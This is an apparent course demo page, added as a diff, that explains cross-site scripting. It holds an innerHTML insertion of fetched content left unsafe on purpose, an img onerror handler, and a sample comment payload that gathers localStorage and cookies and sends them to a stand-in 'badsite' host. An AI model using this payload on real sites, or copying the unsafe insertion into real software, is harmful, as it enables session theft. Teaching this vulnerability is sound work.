@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>What is XSS?</title>
+</head>
+
+<body>
+
+	<h1>XSS; Cross Site Scripting</h1>
+
+	<main id="main">
+		<form action="#" id="myForm">
+			<p>
+				<label for="comments">Comments</label>
+				<textarea name="comments" id="comments" cols="30" rows="10">	</textarea>
+			</p>
+			<p><button id="btn">Add</button></p>
+
+		</form>
+
+		<img src="http://127.0.0.1:5501/2.JS%20in%20the%20browser/73.xss/nefarious.json?test=2" alt="cross side scripted"
+			onerror="javascript: console.log('script from onerror attr'); this.style.opacity=0.5">
+	</main>
+
+	<section id="output"></section>
+
+	<h3>Sample of what is being pasted in to the comment field</h3>
+	<code>
+		<pre>
+			&lt;span onmouseover="javascript:console.log('something bad just happened');<br/>
+			this.style.backgroundColor='lavender';<br/>
+			let ls=localStorage.length;<br/>
+			let s='';<br/>
+			for(let i=0;i&lt;ls;i++){<br/>
+					let k=localStorage.key(i);<br/>
+					s.concat(JSON.stringify(localStorage.getItem(k)));<br/>
+			};<br/>
+			let c = document.cookie;
+			s.concat('&amp;', c);
+			let u='http://localhost/badsite/savedata.php?data='+encodeURIComponent(s);<br/>
+			fetch(u).catch((err)=>console.log(err));"&gt;
+			Some text that the user won't see&lt;/span&gt;<br/>
+		</pre>
+	</code>
+
+	<script>
+		// Simulate the submission of the form data to our PHP page which will
+		// return some JSON for us to include.
+		document.getElementById('btn').addEventListener('click', ev => {
+			ev.preventDefault();
+			// This is the simulated response
+			fetch("./nefarious.json")
+				.then(response => response.json())
+				.then(data => {
+					let p = document.createElement('p'),
+						content = decodeURIComponent(data.content);
+
+					console.log(content);
+					p.innerHTML = content;
+					document.getElementById('output').appendChild(p);
+				})
+			console.log(document.cookie);
+		})
+	</script>
+</body>
+
+</html>
